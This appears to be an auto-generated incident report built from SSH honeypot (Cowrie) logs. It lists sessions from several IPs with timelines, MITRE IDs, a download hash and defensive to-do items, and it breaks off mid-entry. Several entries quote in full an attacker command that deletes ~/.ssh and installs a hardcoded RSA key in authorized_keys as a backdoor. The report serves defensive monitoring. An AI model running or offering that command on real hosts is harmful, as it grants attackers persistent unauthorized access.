| Field | Detail |
|---|---|
| **Source IP** | `158.69.194[.]34` |
| **First Seen** | 2026-04-07 05:31 |
| **Last Seen** | 2026-04-07 05:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:31:09` | `cowrie.session.connect` |
| `2026-04-07 05:31:09` | `cowrie.client.version` |
| `2026-04-07 05:31:09` | `cowrie.client.kex` |
| `2026-04-07 05:31:10` | `cowrie.login.success` |
| `2026-04-07 05:31:10` | `cowrie.session.params` |
| `2026-04-07 05:31:10` | `cowrie.command.input` |
| `2026-04-07 05:31:10` | `cowrie.command.failed` |
| `2026-04-07 05:31:11` | `cowrie.log.closed` |
| `2026-04-07 05:31:11` | `cowrie.session.params` |
| `2026-04-07 05:31:11` | `cowrie.command.input` |
| `2026-04-07 05:31:11` | `cowrie.session.file_download` |
| `2026-04-07 05:31:11` | `cowrie.log.closed` |
| `2026-04-07 05:31:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.69.194[.]34` to AbuseIPDB if not already reported
- [ ] Block `158.69.194[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b9adcd0618d

| Field | Detail |
|---|---|
| **Source IP** | `158.69.194[.]34` |
| **First Seen** | 2026-04-07 05:31 |
| **Last Seen** | 2026-04-07 05:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:31:14` | `cowrie.session.connect` |
| `2026-04-07 05:31:14` | `cowrie.client.version` |
| `2026-04-07 05:31:14` | `cowrie.client.kex` |
| `2026-04-07 05:31:15` | `cowrie.login.success` |
| `2026-04-07 05:31:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.69.194[.]34` to AbuseIPDB if not already reported
- [ ] Block `158.69.194[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34ce4c4304f9

| Field | Detail |
|---|---|
| **Source IP** | `117.6.44[.]221` |
| **First Seen** | 2026-04-07 05:31 |
| **Last Seen** | 2026-04-07 05:31 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:31:42` | `cowrie.session.connect` |
| `2026-04-07 05:31:42` | `cowrie.client.version` |
| `2026-04-07 05:31:42` | `cowrie.client.kex` |
| `2026-04-07 05:31:42` | `cowrie.login.success` |
| `2026-04-07 05:31:43` | `cowrie.session.params` |
| `2026-04-07 05:31:43` | `cowrie.command.input` |
| `2026-04-07 05:31:43` | `cowrie.command.failed` |
| `2026-04-07 05:31:43` | `cowrie.log.closed` |
| `2026-04-07 05:31:43` | `cowrie.session.params` |
| `2026-04-07 05:31:43` | `cowrie.command.input` |
| `2026-04-07 05:31:43` | `cowrie.session.file_download` |
| `2026-04-07 05:31:43` | `cowrie.log.closed` |
| `2026-04-07 05:31:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.6.44[.]221` to AbuseIPDB if not already reported
- [ ] Block `117.6.44[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43a5bb4af106

| Field | Detail |
|---|---|
| **Source IP** | `117.6.44[.]221` |
| **First Seen** | 2026-04-07 05:31 |
| **Last Seen** | 2026-04-07 05:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:31:45` | `cowrie.session.connect` |
| `2026-04-07 05:31:45` | `cowrie.client.version` |
| `2026-04-07 05:31:45` | `cowrie.client.kex` |
| `2026-04-07 05:31:46` | `cowrie.login.success` |
| `2026-04-07 05:31:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.6.44[.]221` to AbuseIPDB if not already reported
- [ ] Block `117.6.44[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2afbf4cddda6

| Field | Detail |
|---|---|
| **Source IP** | `82.152.132[.]24` |
| **First Seen** | 2026-04-07 05:31 |
| **Last Seen** | 2026-04-07 05:31 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:31:52` | `cowrie.session.connect` |
| `2026-04-07 05:31:52` | `cowrie.client.version` |
| `2026-04-07 05:31:52` | `cowrie.client.kex` |
| `2026-04-07 05:31:52` | `cowrie.login.success` |
| `2026-04-07 05:31:53` | `cowrie.session.params` |
| `2026-04-07 05:31:53` | `cowrie.command.input` |
| `2026-04-07 05:31:53` | `cowrie.command.failed` |
| `2026-04-07 05:31:53` | `cowrie.log.closed` |
| `2026-04-07 05:31:53` | `cowrie.session.params` |
| `2026-04-07 05:31:53` | `cowrie.command.input` |
| `2026-04-07 05:31:53` | `cowrie.session.file_download` |
| `2026-04-07 05:31:53` | `cowrie.log.closed` |
| `2026-04-07 05:31:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.152.132[.]24` to AbuseIPDB if not already reported
- [ ] Block `82.152.132[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad40602ceb82

| Field | Detail |
|---|---|
| **Source IP** | `82.152.132[.]24` |
| **First Seen** | 2026-04-07 05:31 |
| **Last Seen** | 2026-04-07 05:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:31:56` | `cowrie.session.connect` |
| `2026-04-07 05:31:56` | `cowrie.client.version` |
| `2026-04-07 05:31:56` | `cowrie.client.kex` |
| `2026-04-07 05:31:56` | `cowrie.login.success` |
| `2026-04-07 05:31:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.152.132[.]24` to AbuseIPDB if not already reported
- [ ] Block `82.152.132[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20d2b18afb86

| Field | Detail |
|---|---|
| **Source IP** | `158.69.194[.]34` |
| **First Seen** | 2026-04-07 05:34 |
| **Last Seen** | 2026-04-07 05:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:34:17` | `cowrie.session.connect` |
| `2026-04-07 05:34:17` | `cowrie.client.version` |
| `2026-04-07 05:34:17` | `cowrie.client.kex` |
| `2026-04-07 05:34:18` | `cowrie.login.success` |
| `2026-04-07 05:34:19` | `cowrie.session.params` |
| `2026-04-07 05:34:19` | `cowrie.command.input` |
| `2026-04-07 05:34:19` | `cowrie.command.failed` |
| `2026-04-07 05:34:19` | `cowrie.log.closed` |
| `2026-04-07 05:34:20` | `cowrie.session.params` |
| `2026-04-07 05:34:20` | `cowrie.command.input` |
| `2026-04-07 05:34:20` | `cowrie.session.file_download` |
| `2026-04-07 05:34:20` | `cowrie.log.closed` |
| `2026-04-07 05:34:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.69.194[.]34` to AbuseIPDB if not already reported
- [ ] Block `158.69.194[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8255bc84406

| Field | Detail |
|---|---|
| **Source IP** | `158.69.194[.]34` |
| **First Seen** | 2026-04-07 05:34 |
| **Last Seen** | 2026-04-07 05:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:34:23` | `cowrie.session.connect` |
| `2026-04-07 05:34:23` | `cowrie.client.version` |
| `2026-04-07 05:34:23` | `cowrie.client.kex` |
| `2026-04-07 05:34:24` | `cowrie.login.success` |
| `2026-04-07 05:34:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.69.194[.]34` to AbuseIPDB if not already reported
- [ ] Block `158.69.194[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2dfb18f9b63

| Field | Detail |
|---|---|
| **Source IP** | `82.152.132[.]24` |
| **First Seen** | 2026-04-07 05:34 |
| **Last Seen** | 2026-04-07 05:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:34:57` | `cowrie.session.connect` |
| `2026-04-07 05:34:57` | `cowrie.client.version` |
| `2026-04-07 05:34:58` | `cowrie.client.kex` |
| `2026-04-07 05:34:58` | `cowrie.login.success` |
| `2026-04-07 05:34:59` | `cowrie.session.params` |
| `2026-04-07 05:34:59` | `cowrie.command.input` |
| `2026-04-07 05:34:59` | `cowrie.command.failed` |
| `2026-04-07 05:34:59` | `cowrie.log.closed` |
| `2026-04-07 05:34:59` | `cowrie.session.params` |
| `2026-04-07 05:34:59` | `cowrie.command.input` |
| `2026-04-07 05:34:59` | `cowrie.session.file_download` |
| `2026-04-07 05:34:59` | `cowrie.log.closed` |
| `2026-04-07 05:35:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.152.132[.]24` to AbuseIPDB if not already reported
- [ ] Block `82.152.132[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4704d8cb000a

| Field | Detail |
|---|---|
| **Source IP** | `82.152.132[.]24` |
| **First Seen** | 2026-04-07 05:35 |
| **Last Seen** | 2026-04-07 05:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:35:01` | `cowrie.session.connect` |
| `2026-04-07 05:35:01` | `cowrie.client.version` |
| `2026-04-07 05:35:02` | `cowrie.client.kex` |
| `2026-04-07 05:35:02` | `cowrie.login.success` |
| `2026-04-07 05:35:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.152.132[.]24` to AbuseIPDB if not already reported
- [ ] Block `82.152.132[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f9794faa0c8

| Field | Detail |
|---|---|
| **Source IP** | `158.69.194[.]34` |
| **First Seen** | 2026-04-07 05:35 |
| **Last Seen** | 2026-04-07 05:35 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:35:51` | `cowrie.session.connect` |
| `2026-04-07 05:35:51` | `cowrie.client.version` |
| `2026-04-07 05:35:52` | `cowrie.client.kex` |
| `2026-04-07 05:35:53` | `cowrie.login.success` |
| `2026-04-07 05:35:53` | `cowrie.session.params` |
| `2026-04-07 05:35:53` | `cowrie.command.input` |
| `2026-04-07 05:35:53` | `cowrie.command.failed` |
| `2026-04-07 05:35:53` | `cowrie.log.closed` |
| `2026-04-07 05:35:54` | `cowrie.session.params` |
| `2026-04-07 05:35:54` | `cowrie.command.input` |
| `2026-04-07 05:35:54` | `cowrie.session.file_download` |
| `2026-04-07 05:35:54` | `cowrie.log.closed` |
| `2026-04-07 05:35:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.69.194[.]34` to AbuseIPDB if not already reported
- [ ] Block `158.69.194[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0cb6d7b93f7

| Field | Detail |
|---|---|
| **Source IP** | `158.69.194[.]34` |
| **First Seen** | 2026-04-07 05:35 |
| **Last Seen** | 2026-04-07 05:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:35:57` | `cowrie.session.connect` |
| `2026-04-07 05:35:57` | `cowrie.client.version` |
| `2026-04-07 05:35:57` | `cowrie.client.kex` |
| `2026-04-07 05:35:58` | `cowrie.login.success` |
| `2026-04-07 05:35:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.69.194[.]34` to AbuseIPDB if not already reported
- [ ] Block `158.69.194[.]34` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-226f6337bf9f

| Field | Detail |
|---|---|
| **Source IP** | `82.152.132[.]24` |
| **First Seen** | 2026-04-07 05:38 |
| **Last Seen** | 2026-04-07 05:38 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:38:07` | `cowrie.session.connect` |
| `2026-04-07 05:38:07` | `cowrie.client.version` |
| `2026-04-07 05:38:08` | `cowrie.client.kex` |
| `2026-04-07 05:38:08` | `cowrie.login.success` |
| `2026-04-07 05:38:09` | `cowrie.session.params` |
| `2026-04-07 05:38:09` | `cowrie.command.input` |
| `2026-04-07 05:38:09` | `cowrie.command.failed` |
| `2026-04-07 05:38:09` | `cowrie.log.closed` |
| `2026-04-07 05:38:09` | `cowrie.session.params` |
| `2026-04-07 05:38:09` | `cowrie.command.input` |
| `2026-04-07 05:38:09` | `cowrie.session.file_download` |
| `2026-04-07 05:38:09` | `cowrie.log.closed` |
| `2026-04-07 05:38:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.152.132[.]24` to AbuseIPDB if not already reported
- [ ] Block `82.152.132[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f775cda36f67

| Field | Detail |
|---|---|
| **Source IP** | `82.152.132[.]24` |
| **First Seen** | 2026-04-07 05:38 |
| **Last Seen** | 2026-04-07 05:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:38:12` | `cowrie.session.connect` |
| `2026-04-07 05:38:12` | `cowrie.client.version` |
| `2026-04-07 05:38:12` | `cowrie.client.kex` |
| `2026-04-07 05:38:12` | `cowrie.login.success` |
| `2026-04-07 05:38:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.152.132[.]24` to AbuseIPDB if not already reported
- [ ] Block `82.152.132[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cd99b8a8a5e

| Field | Detail |
|---|---|
| **Source IP** | `117.6.44[.]221` |
| **First Seen** | 2026-04-07 05:38 |
| **Last Seen** | 2026-04-07 05:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:38:50` | `cowrie.session.connect` |
| `2026-04-07 05:38:50` | `cowrie.client.version` |
| `2026-04-07 05:38:50` | `cowrie.client.kex` |
| `2026-04-07 05:38:51` | `cowrie.login.success` |
| `2026-04-07 05:38:51` | `cowrie.session.params` |
| `2026-04-07 05:38:51` | `cowrie.command.input` |
| `2026-04-07 05:38:51` | `cowrie.command.failed` |
| `2026-04-07 05:38:51` | `cowrie.log.closed` |
| `2026-04-07 05:38:52` | `cowrie.session.params` |
| `2026-04-07 05:38:52` | `cowrie.command.input` |
| `2026-04-07 05:38:52` | `cowrie.session.file_download` |
| `2026-04-07 05:38:52` | `cowrie.log.closed` |
| `2026-04-07 05:38:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.6.44[.]221` to AbuseIPDB if not already reported
- [ ] Block `117.6.44[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cf714dea50d

| Field | Detail |
|---|---|
| **Source IP** | `117.6.44[.]221` |
| **First Seen** | 2026-04-07 05:38 |
| **Last Seen** | 2026-04-07 05:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:38:53` | `cowrie.session.connect` |
| `2026-04-07 05:38:53` | `cowrie.client.version` |
| `2026-04-07 05:38:54` | `cowrie.client.kex` |
| `2026-04-07 05:38:54` | `cowrie.login.success` |
| `2026-04-07 05:38:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.6.44[.]221` to AbuseIPDB if not already reported
- [ ] Block `117.6.44[.]221` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90c2d93efc3b

| Field | Detail |
|---|---|
| **Source IP** | `117.6.44[.]221` |
| **First Seen** | 2026-04-07 05:40 |
| **Last Seen** | 2026-04-07 05:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-07 05:40:37` | `cowrie.session.connect` |
